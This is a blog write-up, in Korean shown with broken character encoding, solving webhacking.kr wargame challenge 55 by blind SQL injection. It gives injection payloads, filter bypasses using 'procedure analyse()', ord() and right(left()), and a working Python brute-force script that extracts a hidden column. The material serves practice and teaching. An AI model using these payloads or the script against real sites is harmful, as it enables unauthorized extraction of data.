---
title: "[webhacking.kr] 55ë²ˆ ë¬¸ì œ í’€ì´[Blind SQL Injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - blind sql injection
toc: true
toc_sticky: true
toc_label: "55ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ðŸ’¡ Webhacking.kr challenge(old) 55ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ìž…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ

  ê²Œìž„ í™”ë©´ 

  ![image](https://user-images.githubusercontent.com/33647663/153992949-e8311e48-9e0d-4038-a5cb-eccb5ef31b26.png){: .align-center}



  ëž­í‚¹ ì¡°íšŒ í™”ë©´

  ![image](https://user-images.githubusercontent.com/33647663/153993010-6e0b01d3-ffcc-4a5f-99f5-316d3e86040f.png){: .align-center}


  ë§ˆìš°ìŠ¤ë¥¼ ì›€ì§ì´ë©´ ê·¸ë¦¼ì´ ë”°ë¼ì›€ì§ì´ê³ , scoreê°€ DBì— ì €ìž¥ë©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/153999656-de31cfac-e90b-4c1e-887b-b6071e378aec.png){: .align-center}




# ì‹¤íŒ¨í•œ ì‹œë„
  ìš°ì„  ì„±ê³µí•˜ì§„ ëª»í–ˆì§€ë§Œ ì²˜ìŒ ì‹œë„í•œ ë°©ë²•ì€ insert ë¬¸ì„ ì´ìš©í•´ì„œ DBì— ì¶”ê°€ì ì¸ ë°ì´í„° ì‚½ìž…ì„ ì‹œë„í–ˆìŠµë‹ˆë‹¤. í˜„ìž¬ scoreì— ë”°ë¼ì„œ DBì—ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë°ì´í„°ê°€ ë“¤ì–´ê°‘ë‹ˆë‹¤. trim í•¨ìˆ˜ëŠ” ì£¼ì–´ì§„ ë¬¸ìžì—´ì˜ ë§¨ ì•žê³¼ ë§¨ ë’¤ì˜ ê³µë°±ì„ ì œê±°í•˜ëŠ” í•¨ìˆ˜ê¸° ë•Œë¬¸ì— scoreì— ê³µë°±ë§Œ ì£¼ì§€ ì•ŠëŠ”ë‹¤ë©´ ë‹¤ìŒê³¼ ë™ì¼í•˜ê²Œ ìž‘ë™í•©ë‹ˆë‹¤.

  ```sql
insert into chall55 values('{id}','{score}','{flag}')
  ```  

  ë”°ë¼ì„œ scoreì— ë‹¤ìŒê³¼ ê°™ì´ injectionì„ ì‹œë„í•©ë‹ˆë‹¤. **ì´ë•Œ, scoreë¡œ ë„£ëŠ” ê°’ì€ rankingì—ì„œ ì¡°íšŒë˜ì§€ ì•ŠëŠ” ì ìˆ˜ë“¤ìž…ë‹ˆë‹¤.**

  ```sql
score = 8080','flag'),(database(),'8081
  ```

  ê·¸ëŸ¬ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì¿¼ë¦¬ë¬¸ì´ ìž‘ë™í•˜ì—¬, 8081ì„ ì¡°íšŒí•˜ë©´ DBëª…ì´ ë“¤ì–´ê°ˆ ê²ƒìž…ë‹ˆë‹¤.

```sql
insert into chall55 values('oksusu98','8080','flag'),(database(),'8081','flag')
```

í•˜ì§€ë§Œ ì‹œë„í•´ë³´ë‹ˆ DBì— insert ê°€ ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ì•„ë§ˆ ë’¤ì—ì„œ ë‚´ë¶€ ë¡œì§ìœ¼ë¡œ í•„í„°ë§ í•˜ëŠ” ë¡œì§ì´ ìžˆëŠ” ê²ƒ ê°™ìŠµë‹ˆë‹¤.

# ë¬¸ì œ í’€ì´
  ê·¸ ë‹¤ìŒì— ì‹œë„í•œ ë¶€ë¶„ì€ ëž­í‚¹ì—ì„œ í…Œì´ë¸”ì„ ê²€ìƒ‰í•´ì˜¤ëŠ” ë¶€ë¶„ì˜ sql ì„ ì¸ì ì…˜ í•´ë´¤ìŠµë‹ˆë‹¤. tableì—ì„œ ë°ì´í„°ë¥¼ ê²€ìƒ‰í•´ì˜¤ëŠ” ë¡œì§ì€ ë‹¤ìŒê³¼ ê°™ì´ ì¶”ì •ë©ë‹ˆë‹¤.

  ```sql
select * from chall55 where score = {}; # scoreê°€ intí˜•ì¸ ê²½ìš°
select * from chall55 where score = '{}'; # scoreê°€ charí˜•ì¸ ê²½ìš°
  ```

  ì‹œë„ í•´ë³¸ ê²°ê³¼ scoreëŠ” intí˜•ìœ¼ë¡œ ì €ìž¥ë˜ì–´ ìžˆì—ˆê³ , ë‹¤ìŒê³¼ ê°™ì´ injectionì„ ì‹œë„í•´ë³´ë‹ˆ ì„±ê³µì ìœ¼ë¡œ ë˜ì—ˆìŠµë‹ˆë‹¤.

  **2=2**ë¡œ ì‹œë„í•œ ê²°ê³¼

  ![image](https://user-images.githubusercontent.com/33647663/154000909-b6148adb-a636-4193-b005-6d77218eb4f5.png){: .align-center}

  **2=1**ë¡œ ì‹œë„í•œ ê²°ê³¼

  ![image](https://user-images.githubusercontent.com/33647663/154000982-c2b0eeb7-5493-48d2-aeed-855b6dba5931.png){: .align-center}

ìš°ì„  scoreë¡œ blind sql injectionì„ ìˆ˜í–‰ ê°€ëŠ¥í•¨ì„ ì•Œì•˜ìŠµë‹ˆë‹¤.

ê·¸ë¦¬ê³  blind sql injectionì„ ìˆ˜í–‰í•˜ëŠ”ë° select ë¬¸ì´ í•„í„°ë§ ë˜ì–´ ìžˆì—ˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/154001183-8abad69f-fe45-49d4-bae4-482893dd866e.png){: .align-center}

select ë¬¸ì´ í•„í„°ë§ ë˜ì–´ìžˆì„ë•Œ, í…Œì´ë¸”ëª…ì„ ì•Œì•„ì˜¤ëŠ” ë°©ë²•ì€ procedure analyse()ë¥¼ ì´ìš©í•˜ëŠ” ë°©ë²•ì´ ìžˆì–´ì„œ ì´ë¥¼ ì´ìš©í–ˆìŠµë‹ˆë‹¤.

**score = 1 procedure analyse()**

![image](https://user-images.githubusercontent.com/33647663/154001362-f934944f-3cd0-448b-9adb-3b715999ce4d.png){: .align-center}


ì‹¤í–‰ê²°ê³¼ DBëª…, tableëª…, column ëª…ì„ ì•Œìˆ˜ ìžˆì—ˆìŠµë‹ˆë‹¤. ì´ì œ ì°¨ë¡€ëŒ€ë¡œ columnëª…ì„ ì•Œì•„ì˜µë‹ˆë‹¤.


**score = 1 limit 1,1 procedure analyse()**

![image](https://user-images.githubusercontent.com/33647663/154001536-806819f8-0480-4006-bd9c-578a8cd37168.png){: .align-center}

**score = 1 limit 2,1 procedure analyse()**

![image](https://user-images.githubusercontent.com/33647663/154001669-043975ad-0adc-4bf8-9301-649fe86a47ed.png){: .align-center}

Flagê°€ ë“¤ì–´ìžˆëŠ” ì»¬ëŸ¼ëª…ì„ ì•Œì•„ëƒˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ì„œ blind sql injectionì„ ìˆ˜í–‰í•˜ë©´ ë©ë‹ˆë‹¤.


blind sql injectionì— ì‚¬ìš©í•œ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìœ¼ë©° í•„í„°ë§ì„ ìš°íšŒí•œ ê¸°ë²•ìœ¼ë¡œëŠ” ë‹¤ìŒ 2ê°€ì§€ë¥¼ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤.

1. ascii -> ord ìš°íšŒ
2. substr -> right(left('string',1),1) ìš°íšŒ

```python
import requests
import string

url = "https://webhacking.kr/challenge/web-31/rank.php"
params = {}
TRUE_FLAG = 'Piterpan'  # 1=1 ì¼ë•Œ í™”ë©´ì— ì¶œë ¥ë˜ëŠ” id

password_length = 0
for i in range(40):
    payload = "(length(p4ssw0rd_1123581321) = {})".format(i)
    params['score'] = payload
    response = requests.get(url,params=params)
    if(TRUE_FLAG in response.text):
        password_length = i
        print('[+] Password length is',i)
        break

# ë¹„ë°€ë²ˆí˜¸ ê¸¸ì´ 31
# substr(password,3,1) -> right(left(right,3),1)
flag = ''
for i in range(1,password_length+1):
    for character in string.printable:
        payload = '(ord( right(left(p4ssw0rd_1123581321,{}),1)) = {})'.format(i,ord(character))
        params['score'] = payload
        response = requests.get(url,params=params)
        if(TRUE_FLAG in response.text):
            flag += character
            print('\r[+]',i,flag,end='')
            break
    print()

print(flag)
```

